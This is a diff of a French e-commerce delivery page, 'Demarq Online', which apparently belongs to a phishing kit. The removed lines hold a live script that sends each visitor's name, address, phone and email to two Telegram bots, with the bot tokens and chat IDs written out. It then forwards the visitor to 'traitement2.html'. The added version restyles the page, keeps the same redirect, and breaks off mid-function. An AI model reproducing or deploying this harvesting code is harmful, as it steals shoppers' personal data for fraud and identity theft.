@@ -1,273 +1,1078 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Informations de Livraison - Demarq Online</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Livraison & Informations Client | Demarq Online</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #002640;
+      --secondary: #e6005c;
+      --accent: #00c853;
+      --light-blue: #b3e6f7;
+      --light-pink: #fff0f5;
+      --light-orange: #ffe5db;
+      --border-orange: #ffc0b3;
+      --text-dark: #222;
+      --text-medium: #555;
+      --text-light: #777;
+      --bg-light: #f6f7f9;
+      --white: #fff;
+      --success: #00e676;
+      --warning: #ff9800;
+      --danger: #f44336;
+      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
+      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.12);
+      --radius-sm: 4px;
+      --radius-md: 8px;
+      --radius-lg: 12px;
+      --radius-xl: 30px;
+      --transition: all 0.3s ease;
+    }
 
-        body {
-            background-color: #f4f6f9;
-            color: #333;
-            font-size: 16px;
-        }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        /* En-tête */
-        header {
-            background-color: #003f5f;
-            color: white;
-            padding: 20px 30px;
-            text-align: center;
-        }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: var(--bg-light);
+      color: var(--text-dark);
+      line-height: 1.6;
+    }
 
-        header h1 {
-            font-size: 36px;
-            font-weight: 600;
-        }
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
 
-        /* Top bar */
-        .top-bar {
-            background-color: #5ac3d1;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            font-size: 14px;
-        }
+    ul {
+      list-style: none;
+    }
 
-        .top-bar span {
-            background-color: #e6005c;
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-weight: bold;
-        }
+    img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
 
-        /* Conteneur principal */
-        .container {
-            max-width: 1100px;
-            margin: 40px auto;
-            padding: 30px;
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+    }
 
-        .section-title {
-            color: #003f5f;
-            font-size: 26px;
-            margin-bottom: 20px;
-        }
+    /* Top Bar */
+    .top-bar {
+      background: var(--light-blue);
+      padding: 10px 0;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+    }
 
-        .form-section {
-            margin-bottom: 20px;
-        }
+    .top-bar__highlight {
+      background: var(--secondary);
+      color: var(--white);
+      padding: 4px 10px;
+      border-radius: var(--radius-sm);
+      font-weight: 600;
+      margin-right: 5px;
+    }
 
-        .form-section label {
-            font-size: 16px;
-            font-weight: bold;
-            color: #003f5f;
-            margin-bottom: 8px;
-            display: block;
-        }
+    /* Header */
+    .header {
+      background: var(--primary);
+      color: var(--white);
+      padding: 15px 0;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: var(--shadow-sm);
+    }
 
-        .form-section input, .form-section select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 16px;
-            margin-bottom: 15px;
-            box-sizing: border-box;
-        }
+    .header__content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+    }
 
-        .form-section input[type="radio"] {
-            width: auto;
-            margin-right: 10px;
-        }
+    .logo {
+      font-size: 24px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+    }
 
-        .form-section .submit-btn {
-            background-color: #e6005c;
-            color: white;
-            padding: 15px;
-            font-size: 18px;
-            text-align: center;
-            width: 100%;
-            border-radius: 8px;
-            border: none;
-            cursor: pointer;
-        }
+    .logo__highlight {
+      color: #00e6e6;
+      margin-left: 5px;
+    }
 
-        .form-section .submit-btn:hover {
-            background-color: #c0392b;
-        }
+    .search {
+      flex: 1;
+      max-width: 600px;
+      position: relative;
+    }
 
-        .footer {
-            background-color: #003f5f;
-            color: white;
-            padding: 40px 30px;
-            text-align: center;
-        }
+    .search__input {
+      width: 100%;
+      padding: 12px 20px;
+      padding-right: 45px;
+      border-radius: var(--radius-xl);
+      border: none;
+      font-size: 14px;
+      transition: var(--transition);
+    }
 
-        .footer p {
-            font-size: 14px;
-            margin-top: 20px;
-        }
+    .search__input:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px var(--secondary);
+    }
 
-        .footer a {
-            color: #00e6e6;
-            text-decoration: none;
-            margin: 5px;
-        }
+    .search__icon {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-medium);
+    }
 
-        .footer a:hover {
-            text-decoration: underline;
-        }
+    .cart {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: var(--transition);
+      padding: 8px 12px;
+      border-radius: var(--radius-md);
+    }
 
-        /* Responsive design */
-        @media (max-width: 768px) {
-            header h1 {
-                font-size: 28px;
-            }
+    .cart:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
 
-            .container {
-                padding: 20px;
-            }
+    .cart__icon {
+      font-size: 18px;
+    }
 
-            .section-title {
-                font-size: 24px;
-            }
+    /* Breadcrumb */
+    .breadcrumb {
+      padding: 15px 0;
+      font-size: 13px;
+      color: var(--text-medium);
+    }
 
-            .form-section input,
-            .form-section select,
-            .form-section .submit-btn {
-                font-size: 14px;
-            }
-        }
-    </style>
+    .breadcrumb__item {
+      display: inline-flex;
+      align-items: center;
+    }
+
+    .breadcrumb__item:not(:last-child)::after {
+      content: '›';
+      margin: 0 8px;
+      color: var(--text-light);
+    }
+
+    .breadcrumb__link {
+      color: var(--text-medium);
+      transition: var(--transition);
+    }
+
+    .breadcrumb__link:hover {
+      color: var(--secondary);
+    }
+
+    /* Checkout Steps */
+    .checkout-steps {
+      display: flex;
+      justify-content: space-between;
+      margin: 30px 0;
+      position: relative;
+    }
+
+    .checkout-steps:before {
+      content: '';
+      position: absolute;
+      top: 20px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: #eee;
+      z-index: 1;
+    }
+
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .step__number {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #eee;
+      color: var(--text-light);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .step.active .step__number {
+      background: var(--accent);
+      color: var(--white);
+    }
+
+    .step.completed .step__number {
+      background: var(--success);
+      color: var(--white);
+    }
+
+    .step__label {
+      font-size: 14px;
+      color: var(--text-light);
+      font-weight: 500;
+    }
+
+    .step.active .step__label {
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    /* Checkout Content */
+    .checkout-content {
+      display: grid;
+      grid-template-columns: 1fr 350px;
+      gap: 30px;
+      margin: 30px 0;
+    }
+
+    @media (max-width: 992px) {
+      .checkout-content {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Delivery Form */
+    .delivery-form {
+      background: var(--white);
+      border-radius: var(--radius-md);
+      padding: 30px;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .section-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .section-title i {
+      color: var(--accent);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+
+    @media (max-width: 576px) {
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: var(--text-medium);
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #ddd;
+      border-radius: var(--radius-md);
+      font-size: 14px;
+      transition: var(--transition);
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(0, 200, 83, 0.2);
+    }
+
+    .form-select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23555' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 15px center;
+      background-size: 12px;
+    }
+
+    /* Delivery Options */
+    .delivery-options {
+      margin-top: 30px;
+    }
+
+    .delivery-option {
+      display: flex;
+      align-items: center;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: var(--radius-md);
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .delivery-option:hover {
+      border-color: var(--accent);
+    }
+
+    .delivery-option.active {
+      border-color: var(--accent);
+      background: rgba(0, 200, 83, 0.05);
+    }
+
+    .delivery-option input {
+      margin-left: 10px;
+    }
+
+    .delivery-option__info {
+      flex: 1;
+      margin-right: 15px;
+    }
+
+    .delivery-option__title {
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+
+    .delivery-option__desc {
+      font-size: 13px;
+      color: var(--text-light);
+    }
+
+    .delivery-option__price {
+      font-weight: 600;
+      color: var(--primary);
+    }
+
+    /* Order Summary */
+    .order-summary {
+      background: var(--white);
+      border-radius: var(--radius-md);
+      padding: 30px;
+      box-shadow: var(--shadow-sm);
+      position: sticky;
+      top: 20px;
+    }
+
+    .summary-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .summary-items {
+      margin-bottom: 20px;
+    }
+
+    .summary-item {
+      display: flex;
+      margin-bottom: 15px;
+    }
+
+    .summary-item__image {
+      width: 60px;
+      height: 60px;
+      border-radius: var(--radius-sm);
+      object-fit: contain;
+      margin-left: 15px;
+    }
+
+    .summary-item__info {
+      flex: 1;
+    }
+
+    .summary-item__name {
+      font-weight: 500;
+      margin-bottom: 5px;
+    }
+
+    .summary-item__price {
+      color: var(--secondary);
+      font-weight: 600;
+    }
+
+    .summary-item__quantity {
+      color: var(--text-light);
+      font-size: 13px;
+    }
+
+    .summary-totals {
+      border-top: 1px solid #eee;
+      padding-top: 20px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .summary-label {
+      color: var(--text-medium);
+    }
+
+    .summary-value {
+      font-weight: 500;
+    }
+
+    .summary-total {
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--primary);
+    }
+
+    /* Checkout Actions */
+    .checkout-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 25px;
+      height: 50px;
+      border-radius: var(--radius-md);
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      border: none;
+      font-size: 16px;
+    }
+
+    .btn--primary {
+      background: var(--accent);
+      color: var(--white);
+    }
+
+    .btn--primary:hover {
+      background: #00b247;
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .btn--secondary {
+      background: var(--primary);
+      color: var(--white);
+    }
+
+    .btn--secondary:hover {
+      background: #001a33;
+    }
+
+    .btn--icon {
+      margin-left: 8px;
+    }
+
+    /* Footer */
+    .footer {
+      background: var(--primary);
+      color: var(--white);
+      padding: 50px 0 30px;
+      margin-top: 50px;
+    }
+
+    .footer__grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 30px;
+      margin-bottom: 40px;
+    }
+
+    @media (max-width: 992px) {
+      .footer__grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 576px) {
+      .footer__grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .footer__title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      position: relative;
+      padding-bottom: 10px;
+    }
+
+    .footer__title:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 40px;
+      height: 2px;
+      background: var(--secondary);
+    }
+
+    .footer__links {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .footer__link {
+      color: rgba(255, 255, 255, 0.8);
+      transition: var(--transition);
+      font-size: 14px;
+    }
+
+    .footer__link:hover {
+      color: var(--white);
+      padding-right: 5px;
+    }
+
+    .newsletter {
+      margin-bottom: 20px;
+    }
+
+    .newsletter__text {
+      margin-bottom: 15px;
+      font-size: 14px;
+      opacity: 0.9;
+    }
+
+    .newsletter__form {
+      display: flex;
+      gap: 10px;
+    }
+
+    .newsletter__input {
+      flex: 1;
+      padding: 10px 15px;
+      border-radius: var(--radius-sm);
+      border: none;
+      font-size: 14px;
+    }
+
+    .newsletter__btn {
+      background: var(--secondary);
+      color: var(--white);
+      border: none;
+      padding: 0 20px;
+      border-radius: var(--radius-sm);
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .newsletter__btn:hover {
+      background: #c5004e;
+    }
+
+    .social-links {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .social-link {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: var(--transition);
+    }
+
+    .social-link:hover {
+      background: var(--secondary);
+      transform: translateY(-3px);
+    }
+
+    .footer__bottom {
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      padding-top: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .copyright {
+      font-size: 13px;
+      opacity: 0.8;
+    }
+
+    .payment-methods {
+      display: flex;
+      gap: 10px;
+    }
+
+    .payment-method {
+      width: 40px;
+      height: 25px;
+      background: var(--white);
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .payment-method img {
+      max-width: 80%;
+      max-height: 80%;
+    }
+
+    .trustpilot {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--success);
+      font-weight: 600;
+    }
+
+    .trustpilot__stars {
+      color: var(--warning);
+    }
+  </style>
 </head>
 <body>
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <span class="top-bar__highlight">LIVRAISON GRATUITE</span> dès 49€ d'achat | Retour gratuit sous 30 jours
+  </div>
 
-    <!-- Top bar -->
-    <div class="top-bar">
-        <span>LIVRAISON GRATUITE dès 49€</span>
+  <!-- Header -->
+  <header class="header">
+    <div class="container header__content">
+      <a href="index.html" class="logo">
+        demarq<span class="logo__highlight">online</span>
+      </a>
+      
+      <div class="search">
+        <input type="text" class="search__input" placeholder="Rechercher un produit, une marque..." aria-label="Rechercher">
+        <i class="fas fa-search search__icon"></i>
+      </div>
+      
+      <a href="panier.html" class="cart">
+        <i class="fas fa-shopping-cart cart__icon"></i>
+        <span>Panier (1)</span>
+      </a>
     </div>
+  </header>
 
-    <!-- Header -->
-    <header>
-        <h1>Demarq Online - Livraison et Informations Client</h1>
-    </header>
+  <!-- Breadcrumb -->
+  <div class="container breadcrumb">
+    <div class="breadcrumb__item">
+      <a href="index.html" class="breadcrumb__link">Accueil</a>
+    </div>
+    <div class="breadcrumb__item">
+      <a href="panier.html" class="breadcrumb__link">Panier</a>
+    </div>
+    <div class="breadcrumb__item">
+      <span>Livraison & Informations</span>
+    </div>
+  </div>
 
-    <!-- Contenu principal -->
-    <div class="container">
-        <h2 class="section-title">Informations de Livraison</h2>
+  <!-- Checkout Steps -->
+  <div class="container checkout-steps">
+    <div class="step completed">
+      <div class="step__number">1</div>
+      <div class="step__label">Panier</div>
+    </div>
+    <div class="step active">
+      <div class="step__number">2</div>
+      <div class="step__label">Livraison</div>
+    </div>
+    <div class="step">
+      <div class="step__number">3</div>
+      <div class="step__label">Paiement</div>
+    </div>
+    <div class="step">
+      <div class="step__number">4</div>
+      <div class="step__label">Confirmation</div>
+    </div>
+  </div>
+
+  <!-- Checkout Content -->
+  <div class="container checkout-content">
+    <!-- Delivery Form -->
+    <div class="delivery-form">
+      <h2 class="section-title"><i class="fas fa-user"></i> Informations client</h2>
+      
+      <form id="deliveryForm">
+        <div class="form-row">
+          <div class="form-group">
+            <label for="firstName" class="form-label">Prénom</label>
+            <input type="text" id="firstName" class="form-control" required>
+          </div>
+          <div class="form-group">
+            <label for="lastName" class="form-label">Nom</label>
+            <input type="text" id="lastName" class="form-control" required>
+          </div>
+        </div>
         
-        <form id="customer-form">
-            <!-- Nom complet -->
-            <div class="form-section">
-                <label for="full-name">Nom Complet <span class="required">*</span></label>
-                <input type="text" id="full-name" name="full-name" required placeholder="Entrez votre nom complet" />
+        <div class="form-group">
+          <label for="email" class="form-label">Email</label>
+          <input type="email" id="email" class="form-control" required>
+        </div>
+        
+        <div class="form-group">
+          <label for="phone" class="form-label">Téléphone</label>
+          <input type="tel" id="phone" class="form-control" required>
+        </div>
+        
+        <h2 class="section-title" style="margin-top: 40px;"><i class="fas fa-truck"></i> Adresse de livraison</h2>
+        
+        <div class="form-group">
+          <label for="address" class="form-label">Adresse</label>
+          <input type="text" id="address" class="form-control" required>
+        </div>
+        
+        <div class="form-row">
+          <div class="form-group">
+            <label for="city" class="form-label">Ville</label>
+            <input type="text" id="city" class="form-control" required>
+          </div>
+          <div class="form-group">
+            <label for="zipCode" class="form-label">Code postal</label>
+            <input type="text" id="zipCode" class="form-control" required>
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <label for="country" class="form-label">Pays</label>
+          <select id="country" class="form-control form-select" required>
+            <option value="">Sélectionnez un pays</option>
+            <option value="FR">France</option>
+            <option value="MA">Maroc</option>
+            <option value="DZ">Algérie</option>
+            <option value="TN">Tunisie</option>
+            <option value="BE">Belgique</option>
+            <option value="CA">Canada</option>
+          </select>
+        </div>
+        
+        <div class="delivery-options">
+          <h2 class="section-title"><i class="fas fa-shipping-fast"></i> Options de livraison</h2>
+          
+          <div class="delivery-option active">
+            <input type="radio" name="delivery" id="delivery1" checked>
+            <div class="delivery-option__info">
+              <div class="delivery-option__title">Livraison standard</div>
+              <div class="delivery-option__desc">Livraison en 3-5 jours ouvrables</div>
             </div>
-
-            <!-- Adresse de livraison -->
-            <div class="form-section">
-                <label for="address">Adresse de Livraison <span class="required">*</span></label>
-                <input type="text" id="address" name="address" required placeholder="Entrez votre adresse" />
+            <div class="delivery-option__price">Gratuit</div>
+          </div>
+          
+          <div class="delivery-option">
+            <input type="radio" name="delivery" id="delivery2">
+            <div class="delivery-option__info">
+              <div class="delivery-option__title">Livraison express</div>
+              <div class="delivery-option__desc">Livraison en 24-48 heures</div>
             </div>
-
-            <!-- Ville -->
-            <div class="form-section">
-                <label for="city">Ville <span class="required">*</span></label>
-                <input type="text" id="city" name="city" required placeholder="Entrez votre ville" />
+            <div class="delivery-option__price">9,99 €</div>
+          </div>
+          
+          <div class="delivery-option">
+            <input type="radio" name="delivery" id="delivery3">
+            <div class="delivery-option__info">
+              <div class="delivery-option__title">Retrait en magasin</div>
+              <div class="delivery-option__desc">Retirez votre commande dans notre magasin de Lille</div>
             </div>
-
-            <!-- Code postal -->
-            <div class="form-section">
-                <label for="postal-code">Code Postal <span class="required">*</span></label>
-                <input type="text" id="postal-code" name="postal-code" required placeholder="Entrez votre code postal" />
-            </div>
-
-            <!-- Numéro de téléphone -->
-            <div class="form-section">
-                <label for="phone">Numéro de Téléphone <span class="required">*</span></label>
-                <input type="tel" id="phone" name="phone" required placeholder="Entrez votre numéro de téléphone" />
-            </div>
-
-            <!-- Email -->
-            <div class="form-section">
-                <label for="email">Email <span class="required">*</span></label>
-                <input type="email" id="email" name="email" required placeholder="Entrez votre email" />
-            </div>
-
-            <!-- Méthode de livraison -->
-            <div class="form-section">
-                <label for="shipping-method">Méthode de Livraison</label>
-                <select id="shipping-method" name="shipping-method">
-                    <option value="standard">Livraison Standard (5 à 7 jours)</option>
-                    <option value="express">Livraison Express (2 à 3 jours)</option>
-                </select>
-            </div>
-
-            <!-- Bouton soumettre -->
-            <div class="form-section">
-                <button type="submit" class="submit-btn">Confirmer la Commande</button>
-            </div>
-        </form>
+            <div class="delivery-option__price">Gratuit</div>
+          </div>
+        </div>
+      </form>
     </div>
-
-    <!-- Footer -->
-    <div class="footer">
-        <p>© 2025 Demarq Online | <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a></p>
-        <p>Suivez-nous sur nos réseaux sociaux</p>
-        <p>
-            <a href="#">Facebook</a> | <a href="#">Instagram</a> | <a href="#">Twitter</a>
-        </p>
+    
+    <!-- Order Summary -->
+    <div class="order-summary">
+      <h3 class="summary-title">Résumé de la commande</h3>
+      
+      <div class="summary-items">
+        <div class="summary-item">
+          <img src="ee7507whtstkeu7-1.jpg" alt="Micros sans fil" class="summary-item__image">
+          <div class="summary-item__info">
+            <div class="summary-item__name">Micros sans fil Intempo EE7507WHTSTKEU7</div>
+            <div class="summary-item__price">14,99 €</div>
+            <div class="summary-item__quantity">Quantité: 1</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="summary-totals">
+        <div class="summary-row">
+          <span class="summary-label">Sous-total</span>
+          <span class="summary-value">14,99 €</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Livraison</span>
+          <span class="summary-value">Gratuit</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Réduction</span>
+          <span class="summary-value">-0,00 €</span>
+        </div>
+        <div class="summary-row" style="margin-top: 15px;">
+          <span class="summary-label summary-total">Total</span>
+          <span class="summary-value summary-total">14,99 €</span>
+        </div>
+      </div>
+      
+      <div class="checkout-actions">
+        <a href="panier.html" class="btn btn--secondary">
+          <i class="fas fa-arrow-left btn--icon"></i>
+          Retour
+        </a>
+        <button type="submit" form="deliveryForm" class="btn btn--primary">
+          Continuer
+          <i class="fas fa-arrow-right btn--icon"></i>
+        </button>
+      </div>
     </div>
+  </div>
 
-    <script>
-        document.getElementById('customer-form').addEventListener('submit', function(event) {
-            event.preventDefault();
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer__grid">
+        <div class="footer__col">
+          <h3 class="footer__title">Service client</h3>
+          <div class="footer__links">
+            <a href="#" class="footer__link">Contactez-nous</a>
+            <a href="#" class="footer__link">FAQ</a>
+            <a href="#" class="footer__link">Suivi de commande</a>
+            <a href="#" class="footer__link">Retours & Remboursements</a>
+            <a href="#" class="footer__link">Guide des tailles</a>
+          </div>
+        </div>
+        
+        <div class="footer__col">
+          <h3 class="footer__title">À propos</h3>
+          <div class="footer__links">
+            <a href="#" class="footer__link">Qui sommes-nous ?</a>
+            <a href="#" class="footer__link">Nos magasins</a>
+            <a href="#" class="footer__link">Carrières</a>
+            <a href="#" class="footer__link">Responsabilité sociale</a>
+            <a href="#" class="footer__link">Presse</a>
+          </div>
+        </div>
+        
+        <div class="footer__col">
+          <h3 class="footer__title">Informations légales</h3>
+          <div class="footer__links">
+            <a href="#" class="footer__link">Conditions générales</a>
+            <a href="#" class="footer__link">Mentions légales</a>
+            <a href="#" class="footer__link">Politique de confidentialité</a>
+            <a href="#" class="footer__link">Politique des cookies</a>
+            <a href="#" class="footer__link">Conditions de vente</a>
+          </div>
+        </div>
+        
+        <div class="footer__col">
+          <h3 class="footer__title">Newsletter</h3>
+          <div class="newsletter">
+            <p class="newsletter__text">Abonnez-vous à notre newsletter pour recevoir nos offres exclusives !</p>
+            <form class="newsletter__form">
+              <input type="email" class="newsletter__input" placeholder="Votre adresse email" required>
+              <button type="submit" class="newsletter__btn">OK</button>
+            </form>
+          </div>
+          
+          <div class="social-links">
+            <a href="#" class="social-link" aria-label="Facebook">
+              <i class="fab fa-facebook-f"></i>
+            </a>
+            <a href="#" class="social-link" aria-label="Instagram">
+              <i class="fab fa-instagram"></i>
+            </a>
+            <a href="#" class="social-link" aria-label="Twitter">
+              <i class="fab fa-twitter"></i>
+            </a>
+            <a href="#" class="social-link" aria-label="YouTube">
+              <i class="fab fa-youtube"></i>
+            </a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="footer__bottom">
+        <div class="copyright">
+          © 2023 Demarq Online. Tous droits réservés.
+        </div>
+        
+        <div class="payment-methods">
+          <div class="payment-method">
+            <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" loading="lazy" alt="Visa">
+          </div>
+          <div class="payment-method">
+            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" loading="lazy" alt="Mastercard">
+          </div>
+          <div class="payment-method">
+            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064076.png" loading="lazy" alt="PayPal">
+          </div>
+          <div class="payment-method">
+            <img src="https://cdn-icons-png.flaticon.com/512/739/739257.png" loading="lazy" alt="CB">
+          </div>
+        </div>
+        
+        <div class="trustpilot">
+          <div class="trustpilot__stars">
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star-half-alt"></i>
+          </div>
+          <span>Trustpilot</span>
+        </div>
+      </div>
+    </div>
+  </footer>
 
-            // Collecte des données du formulaire
-            const fullName = document.getElementById('full-name').value;
-            const address = document.getElementById('address').value;
-            const city = document.getElementById('city').value;
-            const postalCode = document.getElementById('postal-code').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const shippingMethod = document.getElementById('shipping-method').value;
-
-            // Message à envoyer
-            const message = `Nom: ${fullName}\nAdresse: ${address}\nVille: ${city}\nCode Postal: ${postalCode}\nTéléphone: ${phone}\nEmail: ${email}\nMéthode de Livraison: ${shippingMethod}`;
-
-            // Token et ChatID des bots Telegram
-            const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
-            const bot2Token = '7238919189:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
-            const bot1Id = '5372119436';
-            const bot2Id = '5372111022';
-
-            // Envoi au bot1
-            sendToTelegram(bot1Token, bot1Id, message);
-            // Envoi au bot2
-            sendToTelegram(bot2Token, bot2Id, message);
-
-            // Redirection vers la page suivante
-            window.location.href = 'traitement2.html';
-        });
-
-        // Fonction pour envoyer le message au bot Telegram
-        function sendToTelegram(token, chatId, message) {
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-            const params = { chat_id: chatId, text: message };
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(params)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Message envoyé:', data))
-            .catch(error => console.error('Erreur:', error));
+  <script>
+    // Gestion des options de livraison
+    const deliveryOptions = document.querySelectorAll('.delivery-option');
+    
+    deliveryOptions.forEach(option => {
+      option.addEventListener('click', function() {
+        deliveryOptions.forEach(opt => opt.classList.remove('active'));
+        this.classList.add('active');
+        this.querySelector('input').checked = true;
+        
+        // Mettre à jour le prix de livraison dans le résumé
+        const deliveryPrice = this.querySelector('.delivery-option__price').textContent;
+        document.querySelector('.summary-row:nth-child(2) .summary-value').textContent = deliveryPrice;
+        
+        // Calculer le total si nécessaire
+        if (deliveryPrice !== 'Gratuit') {
+          const subtotal = 14.99;
+          const deliveryCost = parseFloat(deliveryPrice.replace('€', '').trim());
+          const total = subtotal + deliveryCost;
+          document.querySelector('.summary-total.summary-value').textContent = total.toFixed(2) + ' €';
+        } else {
+          document.querySelector('.summary-total.summary-value').textContent = '14,99 €';
         }
-    </script>
+      });
+    });
+    
+    // Gestion du formulaire
+    const deliveryForm = document.getElementById('deliveryForm');
+    
+    deliveryForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // Valider le formulaire
+      const isValid = validateForm();
+      
+      if (isValid) {
+        // Stocker les données dans localStorage
+        const formData = {
+          firstName: document.getElementById('firstName').value,
+          lastName: document.getElementById('lastName').value,
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          address: document.getElementById('address').value,
+          city: document.getElementById('city').value,
+          zipCode: document.getElementById('zipCode').value,
+          country: document.getElementById('country').value,
+          delivery: document.querySelector('input[name="delivery"]:checked').parentElement.querySelector('.delivery-option__title').textContent,
+          deliveryPrice: document.querySelector('input[name="delivery"]:checked').parentElement.querySelector('.delivery-option__price').textContent
+        };
+        
+        localStorage.setItem('deliveryInfo', JSON.stringify(formData));
+        
+        // Rediriger vers la page suivante
+        window.location.href = 'traitement2.html';
+      }
+    });
+    
+    function validateForm() {
+      let isValid = true;
+      const requiredFields = document.querySelectorAll('#deliveryForm [required]');
+      
+      requiredFields.forEach(field => {
+        if (!field.value.trim()) {
+          field.style.borderColor = 'var(--danger)';
+          isValid = false;
+        } else {
+          field.style.borderColor = '#ddd';
+        }
+      });
